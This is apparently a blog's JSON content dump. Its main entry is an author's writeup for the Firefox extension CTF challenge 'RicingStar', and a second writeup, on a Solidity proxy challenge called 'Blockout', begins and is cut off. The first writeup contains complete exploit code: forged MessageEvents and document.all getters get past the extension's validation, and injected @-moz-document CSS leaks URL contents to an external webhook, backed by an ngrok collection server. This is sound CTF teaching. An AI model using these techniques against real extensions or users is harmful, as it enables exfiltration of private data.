[{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/authored/","section":"Tags","summary":"","title":"Authored","type":"tags"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/client-side/","section":"Tags","summary":"","title":"Client-Side","type":"tags"},{"content":" simonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/Ctrl\u0026#43;Space-CTF-Finals-2025/RicingStar TL;DR # Forcing a Firefox Xray Vision Waiving on an untrusted object passed via MessageEvent, to a Content Script privileged execution context abusing document.all weirdness, bypassing Content Script validation checks by defining custom getters on the waived document.all and by emptying all DOM tree nodes. Once the malicious object is forwarded to the Extension background script, all browser.scripting.insertCSS API arguments can be set, and therefore injecting an User origin stylesheet with enabled @-moz-document CSS rule to exfiltrate the flag from the challenge page URL.\nDescription # Do you love ricing?\nChallenge Scenario # The challenge is supposed to be about a Custom Theme Generator extension for Firefox, since it\u0026rsquo;s a fairly common practice for \u0026ldquo;ricing\u0026rdquo; enthusiasts to trust third-parties userChrome.css theme files, even though they can be quite powerful. But it\u0026rsquo;s just CSS at the end of the day, right..?\nUpon visiting the challenge page, flying mhackeroni‚Ñ¢ spaceshuttles are flying all over the screen, and switching to the \u0026ldquo;Editor\u0026rdquo; tab, users can customize their Ctrl+Space‚Ñ¢ special edition theme to their likings:\nextension landpage Your browser does not support the video tag. i had a bit too much fun with that :/ The page also invites users to download their customized theme and apply it manually, or by directly installing the provided extension zip file and loading it in their Firefox Add-ons.\nFlying mhackeroni‚Ñ¢ spaceshuttles are now navigating in your chatgpt.com window! Actually, all of them!\nctrl+space‚Ñ¢ google.com Your favorite clanker, mhackeroni‚Ñ¢ themed We can now analyze the actual challenge sources after harassing our GPU :)\nThe challenge bot is fairly simple: it runs a Geckodriver instance under Selenium, allows only http/https URLs, disables WASM and JIT, and finally does the following actions:\ndriver.install_addon(EXTENSION_PATH, temporary=True) driver.get(f\u0026#34;{BASE_URL}/?flag={FLAG}\u0026#34;) driver.switch_to.new_window(\u0026#34;tab\u0026#34;) driver.get(url) time.sleep(TIMEOUT) Which 1) installs the provided extension as a temporary add-on, 2) visits the challenge page with the flag in the URL, 3) opens a new tab with the user-provided URL, and 4) sleeps for 10 seconds before quitting. The player is therefore required to exfiltrate the flag from the challenge page URL, but this can\u0026rsquo;t be done with CSS Injection alone, right..?\nThe extension setup is also quite simple and common: A manifest.json that gives scripting permission to an extension which is running a background.js on install and injects a contentscript.js Content Script on all pages to act as a \u0026ldquo;bridge\u0026rdquo; between the extension \u0026ldquo;privileged\u0026rdquo; execution context and the \u0026ldquo;untrusted\u0026rdquo; page context and DOM.\nmanifest.json\n{ \u0026#34;manifest_version\u0026#34;: 3, \u0026#34;name\u0026#34;: \u0026#34;Ctrl+Space CTF special edition firefox theme\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;‚ú®\u0026#34;, \u0026#34;permissions\u0026#34;: [ \u0026#34;scripting\u0026#34; ], \u0026#34;host_permissions\u0026#34;: [ \u0026#34;*://*/*\u0026#34; ], \u0026#34;background\u0026#34;: { \u0026#34;scripts\u0026#34;: [\u0026#34;background.js\u0026#34;] }, \u0026#34;externally_connectable\u0026#34;: { \u0026#34;matches\u0026#34;: [\u0026#34;http://127.0.0.1:80\u0026#34;, \u0026#34;http://localhost:80\u0026#34;] }, \u0026#34;browser_specific_settings\u0026#34;: { \u0026#34;gecko\u0026#34;: { \u0026#34;id\u0026#34;: \u0026#34;someonethatcantdospacepwnbutwritesffthemes@mhackeroni.it\u0026#34; } } } Note that the extension\u0026rsquo;s manifest defined host_permissions for all URLs, which allows it to inject scripts and stylesheets into any webpage the user visits. Once installed, you\u0026rsquo;ll also notice that the manifest declares externally_connectable URLs, because you\u0026rsquo;ll get the following warning:\nReading manifest: Warning processing externally_connectable: An unexpected property was found in the WebExtension manifest.\nFrom MDN Web Docs:\nExternally connectable controls which other extensions and web pages can communicate with an extension using runtime.connect() and runtime.sendMessage() message passing.\nHowever, as MDN also points out, the functionality is not yet supported in Firefox, which means it‚Äôs useless. This was supposed to just be a cheap anti-slop/anti-LLM/clankers hallucination bait üé£ (pt.1.).\nbackground.js\n// background.js async function setup() { await browser.scripting.registerContentScripts([{ id: \u0026#34;bridge\u0026#34;, js: [\u0026#34;contentscript.js\u0026#34;], matches: [\u0026#34;*://*/*\u0026#34;], world: \u0026#34;ISOLATED\u0026#34; }]); } async function applyTheme(msg, sender) { const extInfo = await browser.management.getSelf(); const ENV = extInfo.installType; if (ENV !== \u0026#34;development\u0026#34;) return; if (sender.id !== browser.runtime.id) return; const defaultOpts = { origin: \u0026#34;AUTHOR\u0026#34;, target: { tabId: sender.tab.id } }; const opts = Object.assign(defaultOpts, msg); await browser.scripting.insertCSS(opts); } browser.runtime.onMessage.addListener(applyTheme); browser.runtime.onInstalled.addListener(setup); The extension\u0026rsquo;s background script registers the content script on install from the extension files, and listens for messages sent from it to apply the theme CSS to the current tab. However, it only applies the theme if the extension is in development mode and the message sender is the extension itself. A few remarks can be made here:\n\u0026ldquo;Development mode\u0026rdquo; just means whether the extension was loaded as a temporary add-on from disk or installed from the store. It\u0026rsquo;s not a controllable flag. The client side bot will install it with the temporary=True flag, meaning the bot will always have that \u0026ldquo;development mode\u0026rdquo; enabled. This was supposed to just be a cheap anti-slop/anti-LLM/clankers hallucination bait üé£ (pt.2.). The sender check is redundant, since runtime.onMessage only receives messages from the extension\u0026rsquo;s own context, i.e. only from the installed content script. This was supposed to just be a cheap anti-slop/anti-LLM/clankers hallucination bait üé£ (pt.3.). The defaultOpts object sets a few default arguments for the insertCSS call, but the object is then merged with the msg object with Object.assign() function, which uses right-to-left precedence, meaning they can be overridden if specified in the msg object. (Not a clanker bait this time). But can we actually specify otherwise in the content script? Let\u0026rsquo;s see.\ncontentscript.js\n// contentscript.js function validateCssRules(cssRules) { for (const rule of cssRules) { if (![CSSStyleRule, CSSFontFaceRule, CSSKeyframesRule].some(type =\u0026gt; rule instanceof type)) { throw new Error(\u0026#34;[SPTE] Only CSS style-rules allowed\u0026#34;); } validateCssRules(rule?.cssRules ?? []); } } function validateInsertOptions(opts) { if (opts.css \u0026amp;\u0026amp; opts.files) { throw new Error(\u0026#34;[SPTE] Cannot specify both CSS and files options\u0026#34;); } if (opts.css \u0026amp;\u0026amp; typeof opts.css === \u0026#34;string\u0026#34;) { const stylesheet = new CSSStyleSheet(); stylesheet.replaceSync(opts.css); validateCssRules(stylesheet.cssRules); } else if (opts.files \u0026amp;\u0026amp; Array.isArray(opts.files)) { for (const fileUrl of opts.files) { if (new URL(fileUrl).origin !== new URL(browser.runtime.getURL(\u0026#34;\u0026#34;)).origin) { throw new Error(\u0026#34;[SPTE] Invalid file origin\u0026#34;); } } } else { throw new Error(\u0026#34;[SPTE] Either CSS or files options must be specified\u0026#34;); } if (opts.origin \u0026amp;\u0026amp; opts.origin !== \u0026#34;AUTHOR\u0026#34;) { throw new Error(\u0026#34;[SPTE] Invalid origin specified\u0026#34;); } } async function applyDefaultTheme() { let fetchedCss = await (await fetch(\u0026#34;http://127.0.0.1:80/img/theme.css\u0026#34;)).text(); browser.runtime.sendMessage(browser.runtime.id, { css: fetchedCss }, {}); }; window.addEventListener(\u0026#34;message\u0026#34;, evt =\u0026gt; { if (evt.origin !== window.origin) return; const options = evt.data || evt.data.wrappedJSObject; validateInsertOptions(options); const details = { ...options }; browser.runtime.sendMessage(browser.runtime.id, details, {}); }); applyDefaultTheme(); The Content Script running in pages listens for incoming message events, validates that the event origin matches the current page origin, and then validates the options object received with validateInsertOptions function before forwarding it to the background script.\nFirst of all, the if (evt.origin !== window.origin) return; check is, again, useless, since the content script is running in the page context, evt.origin will always match window.origin. Moreover, while this is kinda of ok in normal webpages for cross-site protection, it\u0026rsquo;s not in case for extensions. Any origin can dispatch a raw MessageEvent to the page, and it will trigger the content script event listener anyway, effectively bypassing any origin checks, since MessageEvent\u0026rsquo;s constructor has an origin parameter that can be set to any value. The Event\u0026rsquo;s isTrusted property should always be checked in that case, since dispatched raw MessageEvent instances will always have isTrusted set to false.\nThe validateInsertOptions function instead runs a few type checks and nullish/undefined checks on the passed properties, and particularly validates that:\nEither css or files property is specified. If css property is specified, it must be a string containing only CSS \u0026ldquo;style\u0026rdquo; rules (no @import, @media, @supports, @namespace, etc.) (I\u0026rsquo;ve just whitelisted the rules needed by the default CSS theme). If files property is specified, all files must be from the extension\u0026rsquo;s own origin. If origin property is specified, it must be set to \u0026quot;AUTHOR\u0026quot;. As these checks stand, it\u0026rsquo;s not possible to achieve any meaningful injection (except for Firefox 0days :p).\nBut Why?\nStylesheets Origins # The key is mainly in the insertCSS API origin parameter restriction to \u0026quot;AUTHOR\u0026quot; only. This parameter specifies the stylesheet origin being applied.\nFrom MDN Web Docs:\nAuthor stylesheets are the most common type of stylesheet; these are the styles written by web developers. [\u0026hellip;] The author, or web developer, defines the styles for the document using one or more linked or imported stylesheets, \u0026lt;style\u0026gt; blocks, and inline styles defined with the style attribute. These author styles define the look and feel of the website ‚Äî its theme.\nBasically commonly known CSS styles applied by web pages. So what are \u0026ldquo;User stylesheets\u0026rdquo; about then?\nIn most browsers, the user (or reader) of the website can choose to override styles using a custom user stylesheet designed to tailor the experience to the user\u0026rsquo;s wishes. Depending on the user agent, user styles can be configured directly or added via browser extensions.\nThose have something to do with extensions! And these are exactly what type of stylesheets you\u0026rsquo;re using when using custom userChrome.css themes on your riced Firefox setup!\nBut how do they differ in practice? User stylesheets have the higher precedence in the CSS Cascade, meaning they will always override Author stylesheets, even if the Author styles use !important rules. But apart from that, they also sometimes have access to internal or legacy features that only UA stylesheets have!\n@-moz-document at-rule abuse # For example, back in the days, Firefox allowed extensions to use -moz-binding CSS property, which allowed to bind XUL elements (Firefox\u0026rsquo;s own UI elements!) to arbitrary XML files containing XBL components (definitely not safe at all). Those bindings had a weak \u0026ldquo;signed JAR\u0026rdquo; policy that could be bypassed and achieve UXSS! https://www.mozilla.org/en-US/security/advisories/mfsa2008-57/.\nThis is fun but 2008 is long gone, right? (Even tho they restricted it to UA stylesheets only in 2019!)\nYes, but more legacy features are still available. One of them is the -moz-document CSS at-rule. This at-rule allows to apply styling based on document\u0026rsquo;s URL matching.\nOuch :/ Who ever thought that would be a good idea?\nThe feature as MDN documents, it\u0026rsquo;s obviously non-standard, and was deprecated in Firefox after Firefox bug 1035091 that exposed clear security issues with it. However, the rule is still supported in Firefox user stylesheets!\n-moz-document deprecation mdn And since we can define \u0026ldquo;USER\u0026rdquo; origin stylesheets within insertCSS API, we could use it to exfiltrate the flag from the challenge page URL.\nHonestly, I think it‚Äôs kinda okay to have this as a feature in user stylesheets, but it really should be limited to domain matching only. Right now, though, we can clearly match full URLs with it, even using regexes! No CSP is applied to the challenge page, meaning the following rule will be enough to tell us whether the flag has a 0 character in the 2nd place:\n@-moz-document regexp(\u0026#34;http:\\/\\/127\\.0\\.0\\.1:80\\/\\?flag=space..0\u0026#34;) { :root { --background-image: url(\u0026#34;http://webhook/?flag=space{.0\u0026#34;); } } Waiving Firefox Xray Vision by abusing document.all weirdness # Well, but we can\u0026rsquo;t set origin: \u0026quot;USER\u0026quot; parameter because of the content script check, right?\nWe actually can! and it all relies on this little detail in the content script:\nconst options = evt.data || evt.data.wrappedJSObject; The evt.data.wrappedJSObject property is a non-standard Firefox-specific object property present in higher-privileged execution contexts, that allows to access the underlying \u0026ldquo;wrapped\u0026rdquo; JavaScript object from XPCOM components (i.e. the underlying low-level C++ implementation of Javascript objects in the Gecko engine).\nIn Firefox, Javascript running in privileged security context, like extensions files, is called \u0026ldquo;chrome code\u0026rdquo; and it\u0026rsquo;s assumed to be trusted (\u0026ldquo;If chrome-privileged code is compromised, the attacker can take over the user‚Äôs computer.\u0026rdquo;). Meanwhile JavaScript loaded from normal web pages is called \u0026ldquo;content code\u0026rdquo;.\nBut, content code can sometimes reach the chrome code execution context (e.g. think of an object passed inside a postMessage!) and that violates security boundaries:\nThe security machinery in Gecko ensures that there‚Äôs asymmetric access between code at different privilege levels: so for example, content code can‚Äôt access objects created by chrome code, but chrome code can access objects created by content. However, even the ability to access content objects can be a security risk for chrome code. JavaScript‚Äôs a highly malleable language. Scripts running in web pages can add extra properties to DOM objects (also known as expando properties) and even redefine standard DOM objects to do something unexpected. If chrome code relies on such modified objects, it can be tricked into doing things it shouldn‚Äôt.\nTherefore, before reaching that execution context, Firefox applies a security layer called Xray Vision that \u0026ldquo;wraps\u0026rdquo; untrusted user objects and allows the privileged execution context to literally \u0026ldquo;see through\u0026rdquo; the object on any property access and directly use the underlying low-level C++ native implementation, meaning any user-defined expando properties or user redefinitions will be ignored because they exist on the higher-level JavaScript representation only.\nSometimes, however, you actually want to access the full user-defined object, and to do that, you need to \u0026ldquo;Waive the object\u0026rdquo; (i.e. \u0026ldquo;unwrapping\u0026rdquo; the object), and a common way to do so is to use the wrappedJSObject property.\nAs such, this action is considered unsafe, as per MDN Web Docs:\nWaivers are transitive: so if you waive Xray vision for an object, then you automatically waive it for all the object‚Äôs properties. For example, window.wrappedJSObject.document gets you the waived version of document. To undo the waiver again, call Components.utils.unwaiveXrays(waivedObject).\nFocus on the \u0026ldquo;Waivers are transitive\u0026rdquo;: that\u0026rsquo;s exactly what happens in our case!\nAfter obtaining the evt.data.wrappedJSObject object, all the options.css, options.files, options.origin properties, the object prototype chain, the object instance methods, etc. will be the user defined ones.\nWhat does that imply?\nWe can simply define our custom getter methods on the evt.data object to evade in a TOCTOU style the content script validation checks!\nMore concretely:\nvar nCalls = { \u0026#34;css\u0026#34;: 0 }; Object.defineProperty(obj, \u0026#39;css\u0026#39;, { configurable: true, enumerable: true, get() { nCalls.css++; return nCalls.css % 2 === 0 ? evilCss : safeCss; } }); We define on our evt.data object a custom getter for the css property, such that it will return the safeCss string value on the first call (i.e. during validation), and the evilCss string value on the second call (i.e. when the background script will read the property to forward it to insertCSS API).\nWe can apply the same idea to all other properties and effectively make the content script checks useless.\nWe still have one last problem though: options will be defined as evt.data.wrappedJSObject only if evt.data is falsy. How do we even pass a \u0026ldquo;falsy object\u0026rdquo; that can still be called as such? Aren\u0026rsquo;t all objects truthy by definition in JavaScript? E.g:\nif ({}) console.log(\u0026#34;runs\u0026#34;); // \u0026#34;runs\u0026#34; if ([]) console.log(\u0026#34;also runs\u0026#34;); // \u0026#34;also runs\u0026#34; The only exceptions are false, 0, null, undefined, and NaN. However, those are called primitive values and as such they don\u0026rsquo;t have their own properties and methods.\nHow do you even do that??\nLet me introduce yet another legacy deprecated feature:\nThe document.all property (it\u0026rsquo;s still supported on all major browsers this time though!).\nThis is a legacy way to access all elements in the document DOM tree, in their order. It\u0026rsquo;s an alternative to Document.querySelectorAll and returns an HTMLAllCollection object.\nHowever, this object is just straight up weird.\nFor example, what do you think typeof document.all returns? Clearly undefined, right? What about document.all instanceof Object then? Surely true, right? What about if (!document.all) { console.log(\u0026quot;wtf!?\u0026quot;) } ?? All objects are truthy by definition, right????\nWell, try it out yourself:\nconsole.log(document.all instanceof Object); // true console.log(document.all ? \u0026#34;all JS objects are truthy by definition\u0026#34; : \u0026#34;wtf!?\u0026#34;); // \u0026#34;wtf!??\u0026#34; console.log(document.all == false); // false console.log(typeof document.all); // undefined console.log(document.all == null); // true console.log(document.all ?? \u0026#34;should be nullish then, right?\u0026#34;); // undefined // it\u0026#39;s even callable! document.all(\u0026#34;isitevencallable?\u0026#34;) // \u0026lt;div id=\u0026#34;isitevencallable?\u0026#34;\u0026gt; // and even indexable! document.all[0] // \u0026lt;html\u0026gt; Those weird behaviors are due to legacy reasons and web compatibility and are documented in MDN here.\nIn summary, we can use document.all to get a falsy expression on the const options = evt.data || evt.data.wrappedJSObject; line, but still have a user controllable Waived Xray Vision object, and so define our custom getters on it to bypass the content script checks.\nOne last obstacle remains: document.all in fact returns all elements of the page, meaning that even if we redefine custom getters we\u0026rsquo;ll still have excess properties (i.e. the page html elements) inside the details object.\nAlso, given that details is defined as const details = { ...options };, we\u0026rsquo;ll have HTMLElement instances in it and since all postMessages (and therefore browser.runtime.sendMessage) calls use the Structured clone algorithm on the passed object, it will throw a DataCloneError: The object could not be cloned exception.\nWhat about having no html elements at all on the page then? Well, even if we define an empty page, the browser will still at least put the root element \u0026lt;html\u0026gt; in the DOM tree, meaning document.all will still contain at least that. Let alone the \u0026lt;script\u0026gt; tag itself hosting our exploit code.\nWhat about removing *ALL* html elements from the DOM then? Like, all of them? Even the script tag itself, even the root \u0026lt;html\u0026gt; tag!?\nYes, it\u0026rsquo;s possible! (lol)\nwhile (document.firstChild) { document.removeChild(document.firstChild); } console.log(document.all.length); // 0 Finally, turns out that in all modern browsers we can manipulate the document.all object and the DOM tree such that document.all becomes an arbitrary falsy, empty, HTMLAllCollection object that can have arbitrary properties set by javascript or arbitrary named properties set using common DOM clobbering techniques. And it\u0026rsquo;s even callable!\nCSS Exfiltration # At this point, the challenge is pretty much solved. From there, we can achieve CSS injection on the challenge page by passing the crafted document.all object with our custom getters to the content script, with a css property containing our @-moz-document rules to match the flag, and by also passing an origin: \u0026quot;USER\u0026quot; property such that @-moz-document rules are actually enabled and a target: { tabId: ... } property to specify the tab to apply the CSS to (the flag tab will always have tabId = 1 during the bot visit).\nSince I was lenient and put the whole flag in the URL instead of a runtime generated token, you could have even manually exfiltrated the flag by matching each character with multiple reports, but it could have been a bit painful since the flag is 64 chars long.\nMy final exploit, instead, implements a one-shot solver by playing around with the CSS selectors Specificity algorithm: since we will have multiple different @-moz-document rules, each one of them trying to match a different probe, e.g. http://127.0.0.1/?flag?space{a, http://127.0.0.1/?flag?space{b, http://127.0.0.1/?flag?space{aa, etc.\nThe problem in having this many same rules, each one of them specifying a slightly different selector and trying to set the background-image attribute, will incur into a Specificity conflict and only the most specific rules \u0026ldquo;wins\u0026rdquo; the assignment. Therefore, only 1 exfiltration request will be triggered.\nI bypassed this restriction with the following payload generation:\nlet knownFlag = \u0026#34;space{\u0026#34;; function buildEvilCss(nChars) { const totalProbes = nChars * ALPHABET.length; const collector = `:root { background-image: ${Array.from({ length: totalProbes }, (_, i) =\u0026gt; `var(--p${i}, none)`).join(\u0026#34;, \u0026#34;)} !important; }`; const blocks = [collector]; let probeN = 0; for (let pos = 0; pos \u0026lt; nChars; pos++) { for (const char of ALPHABET) { const probePattern = escapeForRegex(BASE_URL + knownFlag + \u0026#34;.\u0026#34;.repeat(pos) + char + \u0026#34;.*\u0026#34;); blocks.push( `@-moz-document regexp(\u0026#34;${probePattern}\u0026#34;) {`, ` :root {`, ` --p${probeN}: url(\u0026#34;${WEBHOOK}/leaked/${probePattern}\u0026#34;);`, ` }`, `}` ); probeN++; } } return blocks.join(\u0026#34;\\n\u0026#34;); } Key detail: each matching rule sets a different custom property: --p0, --p1, --p2, --pN vars. Therefore, no conflicts will arise and all matching rules will be applied, each one triggering a different exfiltration request to my webhook server with the matched probe in the URL.\nThe fact that each defined --pN var is resolved after their assignments is, again, because of the CSS Cascade algorithm order.\nSolution # Wrapping everything up, the final exploit code is the following:\n// exploit.js const WEBHOOK = \u0026#34;https://brle6wul.requestrepo.com\u0026#34;; const BASE_URL = \u0026#34;http://127.0.0.1/?flag=\u0026#34;; const ALPHABET = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789_{}?\u0026#34;; const sleep = (ms) =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); const escapeForRegex = (s) =\u0026gt; s.replace(/[/.?{}]/g, \u0026#34;.\u0026#34;); let knownFlag = \u0026#34;space{\u0026#34;; function buildEvilCss(nChars) { const totalProbes = nChars * ALPHABET.length; const collector = `:root { background-image: ${Array.from({ length: totalProbes }, (_, i) =\u0026gt; `var(--p${i}, none)`).join(\u0026#34;, \u0026#34;)} !important; }`; const blocks = [collector]; let probeN = 0; for (let pos = 0; pos \u0026lt; nChars; pos++) { for (const char of ALPHABET) { const probePattern = escapeForRegex(BASE_URL + knownFlag + \u0026#34;.\u0026#34;.repeat(pos) + char + \u0026#34;.*\u0026#34;); blocks.push( `@-moz-document regexp(\u0026#34;${probePattern}\u0026#34;) {`, ` :root {`, ` --p${probeN}: url(\u0026#34;${WEBHOOK}/leaked/${probePattern}\u0026#34;);`, ` }`, `}` ); probeN++; } } return blocks.join(\u0026#34;\\n\u0026#34;); } function cleanDocumentAllObject() { while (document.firstChild) { document.removeChild(document.firstChild); } } cleanDocumentAllObject(); const evilCss = buildEvilCss(64); const safeCss = `* {color: red !important; }`; var nCalls = { \u0026#34;css\u0026#34;: 0, \u0026#34;origin\u0026#34;: 0 }; Object.defineProperty(document.all, \u0026#39;css\u0026#39;, { configurable: true, enumerable: true, get() { nCalls.css++; return nCalls.css % 2 === 0 ? safeCss : evilCss; } }); Object.defineProperty(document.all, \u0026#39;origin\u0026#39;, { configurable: true, enumerable: true, get: function () { nCalls.origin++; return nCalls.origin % 2 === 0 ? \u0026#34;AUTHOR\u0026#34; : \u0026#34;USER\u0026#34;; } }); Object.defineProperty(document.all, \u0026#39;target\u0026#39;, { configurable: true, enumerable: true, get: function () { return { tabId: 1 }; } }); (async () =\u0026gt; { await sleep(1_000); var fakeMessageEvent = new MessageEvent( \u0026#34;message\u0026#34;, { origin: window.origin, data: document.all } ); window.dispatchEvent(fakeMessageEvent); console.log(\u0026#34;[PAGE] dispatched fake message event\u0026#34;); })(); and this was the server used to automatically startup a ngrok tunnel and reassemble all the collected probes:\n#!/usr/bin/env python3 import os, re, sys, time, json, logging, threading, requests, urllib.parse from flask import Flask, Response from pyngrok import ngrok TARGET = sys.argv[1] if len(sys.argv) \u0026gt; 1 else \u0026#34;http://127.0.0.1\u0026#34; PORT = 8001 TIMEOUT = 20 QUIET_WINDOW = 10 FLAG_PREFIX = \u0026#34;space{\u0026#34; EXPLOIT_TEMPLATE = open(\u0026#34;exploit/exploit.js\u0026#34;).read() def escape_for_regex(text: str) -\u0026gt; str: return re.sub(r\u0026#34;[/.?{}]\u0026#34;, \u0026#34;.\u0026#34;, text) def make_exploit(public_url: str, base_url: str) -\u0026gt; str: body = re.sub(r\u0026#39;const\\s+WEBHOOK\\s*=\\s*\u0026#34;.*?\u0026#34;;\u0026#39;, f\u0026#39;const WEBHOOK = \u0026#34;{public_url}\u0026#34;;\u0026#39;, EXPLOIT_TEMPLATE, count=1) return body def parse_probe(probe: str): flag_index = probe.find(\u0026#34;flag=\u0026#34;) if flag_index == -1: return None fragment = probe[flag_index + 5 :] star_index = fragment.find(\u0026#34;.*\u0026#34;) if star_index == -1: return None value = fragment[:star_index] if not value.startswith(prefix_escaped): return None tail = value[len(prefix_escaped) :] if not tail: return None pos = len(tail) - 1 token = tail[-1] char = token if token != \u0026#34;.\u0026#34; else \u0026#34;?\u0026#34; return pos, char app = Flask(__name__) mutex = threading.Lock() flag_chars = [] html_body = \u0026#34;\u0026#34; exploit_body = \u0026#34;\u0026#34; prefix_escaped = escape_for_regex(FLAG_PREFIX) last_update = 0.0 @app.route(\u0026#34;/\u0026#34;) def index() -\u0026gt; Response: return Response(html_body, mimetype=\u0026#34;text/html\u0026#34;) @app.route(\u0026#34;/exploit.js\u0026#34;) def exploit() -\u0026gt; Response: return Response(exploit_body, mimetype=\u0026#34;application/javascript\u0026#34;) @app.route(\u0026#34;/leaked/\u0026lt;path:pattern\u0026gt;\u0026#34;) def leaked(pattern: str) -\u0026gt; Response: decoded = urllib.parse.unquote(pattern) position_char = parse_probe(decoded) if position_char is not None: pos, ch = position_char with mutex: while len(flag_chars) \u0026lt;= pos: flag_chars.append(\u0026#34;?\u0026#34;) current = flag_chars[pos] if current == ch: return Response(status=204) if current != \u0026#34;?\u0026#34; and ch == \u0026#34;?\u0026#34;: return Response(status=204) flag_chars[pos] = ch global last_update last_update = time.time() logging.info(\u0026#34;Recovered #%d --\u0026gt; %s | %s\u0026#34;, pos + len(FLAG_PREFIX), ch, FLAG_PREFIX + \u0026#34;\u0026#34;.join(flag_chars)) return Response(status=204) def start_server() -\u0026gt; threading.Thread: thread = threading.Thread( target=lambda: app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=PORT, use_reloader=False, threaded=True), daemon=True, ) thread.start() return thread def main() -\u0026gt; int: logging.basicConfig( level=logging.INFO, format=\u0026#34;%(asctime)s | %(levelname)s | %(message)s\u0026#34;, datefmt=\u0026#34;%H:%M:%S\u0026#34;, ) global html_body, exploit_body, flag_chars, last_update base_url = f\u0026#34;{TARGET.rstrip(\u0026#39;/\u0026#39;)}/?flag=\u0026#34; flag_chars.clear() last_update = time.time() html_template = \u0026#34;\u0026#34;\u0026#34;\u0026lt;!doctype html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;script src=\u0026#34;{PUBLIC}/exploit.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;\u0026#34;\u0026#34; logging.info(\u0026#34;Starting local Flask server on port %d\u0026#34;, PORT) start_server() token = os.environ.get(\u0026#34;NGROK_AUTHTOKEN\u0026#34;) if token: ngrok.set_auth_token(token) tunnel = None try: tunnel = ngrok.connect(f\u0026#34;http://127.0.0.1:{PORT}\u0026#34;) public_url = tunnel.public_url.rstrip(\u0026#34;/\u0026#34;) logging.info(\u0026#34;ngrok tunnel: %s\u0026#34;, public_url) html_body = html_template.replace(\u0026#34;{PUBLIC}\u0026#34;, public_url) exploit_body = make_exploit(public_url, base_url) payload = {\u0026#34;url\u0026#34;: f\u0026#34;{public_url}/\u0026#34;} logging.info(\u0026#34;Triggering bot visit to %s\u0026#34;, payload[\u0026#34;url\u0026#34;]) res = requests.post( f\u0026#34;{TARGET.rstrip(\u0026#39;/\u0026#39;)}/bot/visit\u0026#34;, headers={\u0026#34;content-type\u0026#34;: \u0026#34;application/json\u0026#34;}, data=json.dumps(payload), timeout=10, ) res.raise_for_status() logging.info(\u0026#34;Bot accepted the visit. Waiting for leaks...\u0026#34;) deadline = time.time() + TIMEOUT while time.time() \u0026lt; deadline: with mutex: no_updates = (time.time() - last_update \u0026gt; QUIET_WINDOW) and bool(flag_chars) if no_updates: break time.sleep(0.5) with mutex: if not flag_chars: logging.error(\u0026#34;Timeout. No leaks captured.\u0026#34;) return 1 if flag_chars[-1] != \u0026#34;}\u0026#34;: flag_chars[-1] = \u0026#34;}\u0026#34; final_flag = FLAG_PREFIX + \u0026#34;\u0026#34;.join(flag_chars) logging.info(\u0026#34;\\n\\nFlag recovered: %s\u0026#34;, final_flag) print(final_flag) return 0 except requests.RequestException as exc: logging.error(\u0026#34;Bot visit failed: %s\u0026#34;, exc) return 1 finally: if tunnel is not None: try: ngrok.disconnect(tunnel.public_url) except Exception: pass if __name__ == \u0026#34;__main__\u0026#34;: raise SystemExit(main()) Flag # space{s0_much_leg4cy_0ut_there_4nyw4y_h0w_d0_y0u_c4ll_th4t??_ucssi??}\n","date":"1 November 2025","externalUrl":null,"permalink":"/posts/ctrl+space-ctf-finals-2025/ricingstar/","section":"Blog","summary":"Writeup for the Ctrl+Space CTF Finals 2025 web client-side Firefox challenge \u0026ldquo;RicingStar\u0026rdquo;.","title":"Ctrl+Space CTF Finals 2025 - RicingStar [Author Writeup]","type":"posts"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/extensions/","section":"Tags","summary":"","title":"Extensions","type":"tags"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/firefox/","section":"Tags","summary":"","title":"Firefox","type":"tags"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"1 November 2025","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"Web","type":"categories"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/categories/blockchain/","section":"Categories","summary":"","title":"Blockchain","type":"categories"},{"content":" Blockout # 22nd May 2025 Prepared By: perrythepwner Challenge Author(s): perrythepwner Difficulty: Medium\nsimonedimaria/my-ctf-challenges My authored CTF challenges sources and official writeups Solidity 1 0 /tree/main/HTB-BusinessCTF-2025/Blockout TLDR # The VCNKv2 contract is a Contract Factory for \u0026ldquo;gateway\u0026rdquo; contracts, not trusting anymore arbitrary ones as the previous version. Each gateway contract follows the UUPS Proxy pattern, with a custom implementation of the Proxy.sol contract. The Proxy.sol contract has a missing check on the low-level delegatecall return value in the _forward function, allowing failing transactions in the implementation contract to be executed without reverting. Due to the nature of the UUPS pattern, the implementation contract holds the initialize initializer function, that is called by VCNKv2 when deploying new gateway contracts. By registering new gateways within an artificially low gas transaction (‚Äúundergassing‚Äù), the initialize() call runs Out Of Gas and fails silently, leaving the proxy in a uninitialized state and with _KERNEL_SLOT empty. By taking over multiple gateway contracts in a 51% like attack, an attacker can trigger the kernel Emergency Mode via the infrastructureSanityCheck() function.\nDescription # Amazing job, Agent P. Volnaya\u0026rsquo;s \u0026ldquo;VNCK\u0026rdquo; power plant was shut down due to irreparable damage to their infrastructure, leaving a mark in the history books as the \u0026ldquo;GreatBl@ck0Ut attack\u0026rdquo;. However, due to their wealth and the resilience of their APT group, they were able to go back online with a new, more powerful, and secure power grid called \u0026ldquo;VCNKv2\u0026rdquo;. As the final act of Operation \u0026ldquo;Blockout\u0026rdquo; we need to take down the new kernel. I know you can do it.\nSkills Required # Basic understanding of Solidity and smart contracts Interaction with smart contracts Familiarity with Proxy Contract patterns (UUPS, delegatecall) Skills Learned # Auditing custom Proxy implementations Crafting an 